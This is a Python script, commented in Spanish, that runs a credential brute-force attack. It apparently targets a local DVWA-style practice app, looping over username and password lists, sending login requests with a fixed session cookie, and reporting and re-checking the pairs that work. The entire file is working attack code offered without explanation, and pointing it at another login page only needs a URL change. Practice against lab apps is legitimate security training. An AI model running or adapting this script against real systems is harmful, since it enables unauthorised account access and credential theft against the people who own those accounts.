import requests
import time

# --- Configuración ---
target_url = "http://localhost:8080/vulnerabilities/brute/index.php"
failure_string = "Username and/or password incorrect."
success_string = "Welcome"

usernames = ["admin", "gordonb", "1337", "pablo", "smithy", "nouser"]
passwords = ["password", "letmein", "qwerty", "badpass", "123456"]

found_credentials = []

# --- Configuración de cookies ---
cookies = {
    'PHPSESSID': '2a7u2coj0428m90l212v6eq0m6',
    'security': 'low'
}

print("Iniciando ataque de fuerza bruta con Python...")
start_time = time.time()

# --- Lógica del Ataque ---
for user in usernames:
    for pwd in passwords:
        # Crear URL con parámetros para GET
        params = {
            'username': user,
            'password': pwd,
            'Login': 'Login'
        }
        
        # Cabeceras simulando navegador
        headers = {
            'User-Agent': 'Pancitoyhuevo'
        }

        # --- NUEVO: imprimir las cabeceras antes de la petición ---
        print(f"\n[*] Probando credenciales {user}:{pwd}")
        print("[*] Cabeceras usadas:")
        for k, v in headers.items():
            print(f"    {k}: {v}")
        print("[*] Parámetros:")
        for k, v in params.items():
            print(f"    {k}: {v}")
        print("--------------------------------------------------")
        
        try:
            response = requests.get(
                target_url,
                params=params,
                headers=headers,
                cookies=cookies
            )
            
            if failure_string not in response.text and success_string in response.text:
                print(f"[+] ÉXITO! Usuario={user}, Contraseña={pwd}")
                found_credentials.append((user, pwd))
            else:
                print(".", end="", flush=True)
        
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Error de conexión durante el ataque: {e}")
        
        time.sleep(0.1)

# --- Resultados ---
end_time = time.time()
print("\n\nAtaque finalizado.")
print(f"Tiempo total: {end_time - start_time:.2f} segundos")

if found_credentials:
    print("\nCredenciales válidas encontradas:")
    for user, pwd in found_credentials:
        print(f"  Usuario: {user}, Contraseña: {pwd}")
else:
    print("\nNo se encontraron credenciales válidas.")

# --- Verificación de cada par de credenciales encontrado ---
if found_credentials:
    print("\nVerificando cada par de credenciales encontrado:")
    for user, pwd in found_credentials:
        params = {
            'username': user,
            'password': pwd,
            'Login': 'Login'
        }
        response = requests.get(target_url, params=params, cookies=cookies)
        if success_string in response.text:
            print(f"  ✓ Confirmado: {user}:{pwd}")
        else:
            print(f"  ✗ No verificado: {user}:{pwd}")
